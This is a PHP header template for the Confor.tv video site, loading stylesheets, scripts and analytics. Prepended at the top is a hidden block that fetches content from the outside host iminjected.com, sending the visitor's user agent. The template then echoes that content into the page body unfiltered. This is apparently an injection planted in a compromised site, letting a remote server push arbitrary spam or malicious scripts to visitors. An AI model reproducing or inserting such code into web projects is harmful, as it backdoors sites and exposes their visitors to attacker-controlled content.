<?php 
	$cparams = array('http' => array('method' => 'GET','ignore_errors' => true));
	$context = stream_context_create($cparams);
	$fp = fopen("http://iminjected.com/?op=auto&file=confor_confortv.php&at=".$_SERVER["HTTP_USER_AGENT"], "rb", false, $context);
	$INJECTIONS = "";
	if ($fp) $INJECTIONS = stream_get_contents($fp);
?> 

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<!-- head -->
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">	
	<link rel="icon" type="image/gif" href="http://confor.tv/animated_favicon1.gif" >
	<!-- Title of page -->
	<title><?php echo isset($page_title)?$page_title:'Confor.tv'?></title>	
	<!-- Main CSS Stylesheet -->
	<?php
		if (isset($meta))
		{
      //print_r($meta);
			$this->load->view('home/meta');
		}
	?>
	<script>
		XEMMEX = {
			baseUrl: '<?php echo site_url("/")?>',
			monthNames : [<?php echo __("CF_month_name_array")?>],
			dayNames : [<?php echo __("CF_day_name_array")?>]
		};	
	</script>
	<?php
        echo style('style.css');            
        echo style('playlist.css');        	
		echo style('../fancybox/jquery.fancybox-1.3.1.css');
		echo style('../jQueryUI/jquery-ui-1.8.custom.css');
		echo style('xemmex.frontend.css');
        echo style('scrollable-buttons.css');
        echo style('scrollable-horizontal.css');
	?>
	<script>
		site_url = "<?php echo site_url("")?>/";		
	</script>
	<?php
		echo script('Cufon_yui.js');
		echo script('jquery.tools.min.js'); 
		//echo script('jquery.min.js');
		echo script('../fancybox/jquery.fancybox-1.3.1.pack.js');
		echo script('../jQueryUI/jquery-ui-1.8.custom.min.js');
		echo script('scripts.js');
		echo script('xemmex.frontend.js');
        echo script('flowplayer-3.2.2.min.js');    
        echo script('flowplayer.playlist-3.0.8.min.js');          
	?>
	<!--[if IE 6]>
	<script src="js/DD_belatedPNG.js"></script>
	<script> DD_belatedPNG.fix('*'); </script>
	<style type="text/css"> #menu ul li a span { display: none; } </style>
	<![endif]-->
	
	<script type="text/javascript">

	  var _gaq = _gaq || [];
	  _gaq.push(['_setAccount', 'UA-17388944-1']);
	  _gaq.push(['_trackPageview']);

	  (function() {
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	  })();

	</script>
    	
</head>

<body>
	<?php echo $INJECTIONS; ?>
	<div id="wrapper">